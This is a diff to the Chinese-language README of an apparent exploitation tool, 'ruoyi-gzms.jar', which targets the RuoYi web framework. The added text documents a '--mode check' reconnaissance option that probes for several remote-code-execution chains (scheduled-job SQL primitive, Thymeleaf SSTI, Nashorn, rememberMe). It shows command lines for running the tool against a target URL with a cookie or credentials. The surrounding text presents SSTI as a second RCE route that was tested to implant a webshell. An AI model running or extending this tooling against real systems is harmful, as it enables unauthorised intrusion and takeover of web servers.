@@ -40,6 +40,12 @@ java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
 
 ## SSTI 链模式（第二条独立 RCE，实测进马）
 
+先侦察后打点：`--mode check` 自动探测各链/投递可行性并给选型建议（job 链 `${sql}` 原语、ssti 注入、Nashorn、createTable 侧门、rememberMe、JDK 版本；对已加固目标正确转红，探针零残留自动清理）。
+
+```bash
+java -jar ruoyi-gzms.jar --url http://target:8080 --user U --pass P --mode check
+```
+
 `--mode ssti` 走 Thymeleaf SSTI（CacheController `fragment` 注入），与定时任务链完全独立、互为备份。投递三选一：
 
 ```bash
